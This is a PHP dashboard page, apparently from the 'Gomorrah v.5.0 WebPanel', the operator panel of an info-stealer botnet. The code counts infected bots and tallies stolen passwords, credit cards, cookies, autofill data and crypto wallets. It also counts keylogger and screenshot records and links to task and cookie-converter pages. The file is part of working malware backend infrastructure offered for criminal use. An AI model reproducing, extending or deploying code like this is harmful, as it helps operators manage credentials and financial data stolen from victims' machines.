<?php
error_reporting(0);
 session_start();
         if(!isset($_SESSION['username'])){
        header("Location: login.php");	
    	exit('Go To login.php');
        }		

?>
<?php
 include("../config.php");
//include("function.php");


?>

<!doctype html>
<html>
       <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon" />
	    <!--Start Header-->
	  <title> Gomorrah v.5.0 WebPanel</title>
      <script src="../css/bootstrap/js/jquery-2.1.1.js"></script>
       <!-- Latest compiled and minified CSS -->
     
        <!--Bootsrap-rtl -->
	    <link rel="stylesheet" href="../css/bootstrap/css/bootstrap.min.css">
	 
        <!-- Optional theme -->
        <link rel="stylesheet" href="../css/bootstrap/css/bootstrap-theme.min.css">

        <!-- Latest compiled and minified JavaScript -->
        <script src="../css/bootstrap/js/bootstrap.min.js"></script>
   
        <link href='../css/bootstrap/font/CheltenhamStd-BoldCond.otf' rel='stylesheet' type='text/css'>
	        <link href="../css/morrisjs/morris.css" rel="stylesheet">
	    <!--Fonts-->
		<!-- <link href='http://fonts.googleapis.com/earlyaccess/notokufiarabic.css' rel='stylesheet' type='text/css'/>
		<link href='https://fonts.googleapis.com/css?family=Roboto:100,300,400,700,500' rel='stylesheet' type='text/css'>
		<link href="https://fonts.googleapis.com/css?family=Cairo" rel="stylesheet" type='text/css'> -->
    <link rel="stylesheet" href="../js/vanillabox/theme/bitter/vanillabox.css">
        <!--<script type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js"></script>-->
        <script type="text/javascript" src="../js/vanillabox/jquery.vanillabox-0.1.7.min.js"></script>
        <script type="text/JavaScript">
			$(document).ready(function() {
				
	
				$('.venobox').vanillabox();
			});



      </script>


<style>

.gallery:after {
			content: '';
			display: block;
			height: 2px;
			margin: .5em 0 1.4em;
			background-image: -webkit-linear-gradient(left, rgba(0, 0, 0, 0) 0%, rgba(77,77,77,1) 50%, rgba(0, 0, 0, 0) 100%);
			background-image: linear-gradient(to right, rgba(0, 0, 0, 0) 0%, rgba(77,77,77,1) 50%, rgba(0, 0, 0, 0) 100%);
		}
		.gallery img {
			height: 100%;
		}

		.gallery a {
			width: 240px;
			height: 180px;
			display: inline-block;
			margin: 4px 6px;
			overflow:hidden;
			box-shadow: 0 0 4px -1px #000;
		}


*{
	font-family: 'Cairo';
}
body{
	  color: #fff;
      background-color: #000;
      font-family: 'Cairo';
     /* background-image: url(../img/img/0.jpg);*/

      background-repeat: no-repeat;
}
.well{
	background-image: linear-gradient(to bottom,#232323 0,#232323 100%);
}

.table-hover tbody tr:hover td, .table-hover tbody tr:hover th {
      background-color: #121633;
}
.btn {
	color:#fff;
}
.btn:hover{
	color:#36f636;
}
a:hover {
	color: #ffffff;
}
a {
	color:#fff;
	text-decoration :none;
	}


</style>

<?php

$rd = rand(1,7);
if($rd < 8)
{
echo '
<style>
  .wrapper {

  background: url("../img/img/bg/'.$rd.'.jpg"), #111111;
  color: #eee;
  
 
}


</style>';
}


?>


	    <!--bootstrap-rtl-->
	   <!--<link rel="stylesheet" href="../css/bootstrap/css/bootstrap-rtl.css">-->
          <script src="tinymce/tinymce/js/tinymce/tinymce.min.js"></script>	  
	      <script src="../js/Chart.bundle.js"></script>
	      <script src="../js/utils.js"></script>		  
           <style>

		   </style>
		   <link rel="stylesheet" href="../css/dash.css">
		   <link href="../css/ionicons-2.0.1/css/ionicons.css" rel="stylesheet" type="text/css" />
		   <link rel="stylesheet" href="../css/fontawesome-free-5.0.8/web-fonts-with-css/css/fontawesome.min.css">
	       <script defer src="../css/fontawesome-free-5.0.8/svg-with-js/js/fontawesome-all.js"></script>
            </head>
            <body class="wrapper">
			<!--Start container -->
     <div class="container-fluid">
	     <!--Start Row 1-->
        <div class="row" >
            
<nav class="navbar navbar-inverse" style="border-radius:0px;background-color:#232323;opacity: 0.8;" role="navigation">
  <div class="container-fluid" style="background-color:#232323;">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="index.php" style="color:#fff;text-shadow: 0 0 5px #fff, 0 0 10px #9e9e9e, 0 0 15px #2d0000, 0 0 20px #5c0202, 0 0 30px #000000, 0 0 40px #000000, 0 0 50px #000000, 0 0 75px #000000;letter-spacing:2px;font:20px;"><span class="ion-nuclear"></span> Gomorrah v.5 WebPanel</a>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse">

      <ul class="nav navbar-nav navbar-right">

      <li><a href="tasks.php" style="padding-left:3px;">  Tasks  <span class="ion-arrow-graph-up-left" style="padding-right:3px;padding-left:3px;"></span> </a></li>
      <li><a href="settings.php" style="padding-left:3px;">  settings  <span class="ion-android-settings" style="padding-right:3px;padding-left:3px;"></span> </a></li>
      <li><a href="convert.php" style="padding-left:3px;">  Cookie Converter  <span class="ion-code-working" style="padding-right:3px;padding-left:3px;"></span> </a></li>
	      <li><a href="profile.php?id=<?php echo $_SESSION['id_user']; ?>" style="padding-left:3px;"> <?php echo $_SESSION['username']; ?>  <span class="ion-android-person" style="padding-right:3px;padding-left:3px;"></span> </a></li>
        <li><a href="logout.php" style="padding-left:3px;">  Logout  <span class="ion-log-in" style="padding-right:3px;padding-left:3px;"></span> </a></li>

      </ul>
    </div><!-- /.navbar-collapse -->
  </div><!-- /.container-fluid -->
</nav>
		 
        </div>
		  <!--End Row 1-->
<?php


function thousandsCurrencyFormat($num) {

    if($num>1000) {
  
          $x = round($num);
          $x_number_format = number_format($x);
          $x_array = explode(',', $x_number_format);
          $x_parts = array('k', 'm', 'b', 't');
          $x_count_parts = count($x_array) - 1;
          $x_display = $x;
          $x_display = $x_array[0] . ((int) $x_array[1][0] !== 0 ? '.' . $x_array[1][0] : '');
          $x_display .= $x_parts[$x_count_parts - 1];
  
          return $x_display;
  
    }
  
    return $num;
}


$q_Total_bots = mysqli_query($condb,"SELECT * FROM `bot` ");
$count_bot = mysqli_num_rows($q_Total_bots);

$q_Passwords_Reports = mysqli_query($condb,"SELECT SUM(`Passwords`) FROM `logs`");
$count_pws = mysqli_fetch_array($q_Passwords_Reports);
$counter_PWS = thousandsCurrencyFormat($count_pws[0]);

$q_cc = mysqli_query($condb,"SELECT SUM(`CreditCards`) FROM `logs`"); 
$mycount = mysqli_fetch_array($q_cc);
$count_cc = thousandsCurrencyFormat($mycount[0]);

$q_cookies =  mysqli_query($condb,"SELECT SUM(`Cookies`) FROM `logs`"); 
$mycount_cookies = mysqli_fetch_array($q_cookies);
$counter_cookies = thousandsCurrencyFormat($mycount_cookies[0]);

$q_autofull = mysqli_query($condb,"SELECT SUM(`AutoFill`) FROM `logs`"); 
$mycount_autofull = mysqli_fetch_array($q_autofull);
$counter_autofull = thousandsCurrencyFormat($mycount_autofull[0]);


$q_wallets = mysqli_query($condb,"SELECT SUM(`Wallets`) FROM `logs`"); 
$mycount_wallets = mysqli_fetch_array($q_wallets);
$counter_wallets = thousandsCurrencyFormat($mycount_wallets[0]);


$q_Keylogger_Reports = mysqli_query($condb,"SELECT * FROM `keylogger`");
$count_keylogger = mysqli_num_rows($q_Keylogger_Reports);
$count_keylogger2 = thousandsCurrencyFormat($count_keylogger);


$q_Screenshot = mysqli_query($condb,"SELECT * FROM `screenshot`"); 
$count_Screenshot = mysqli_num_rows($q_Screenshot);
$count_Screenshot1 = thousandsCurrencyFormat($count_Screenshot);

$q_tasks = mysqli_query($condb,"SELECT * FROM `tasks`"); 
$count_tasks = mysqli_num_rows($q_tasks);


?>
<?php
include("counterbar.php");
?>
		    <!--Start Row 2-->
         <div class="row" style="font-family: verdana;">
		     <div class="col-md-2" style="padding:0px;">
			<!--<img src="../img/Morningstar.png" class="img-responsive" />-->


		</div>